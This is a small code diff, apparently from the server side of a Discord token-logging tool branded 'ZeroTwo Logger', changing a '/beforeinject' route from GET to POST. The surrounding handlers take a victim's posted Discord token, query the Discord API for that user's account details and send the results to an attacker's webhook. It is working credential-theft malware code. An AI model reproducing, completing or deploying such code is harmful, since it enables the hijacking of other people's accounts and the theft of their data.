@@ -538,7 +538,7 @@ app.post("/inject", (req, res) => {
         .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
     webhook.send(friendEmbed)
 })
-app.get("/beforeinject", (req, res) => {
+app.post("/beforeinject", (req, res) => {
     req = JSON.parse(req.body)
     console.log(req)
     var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
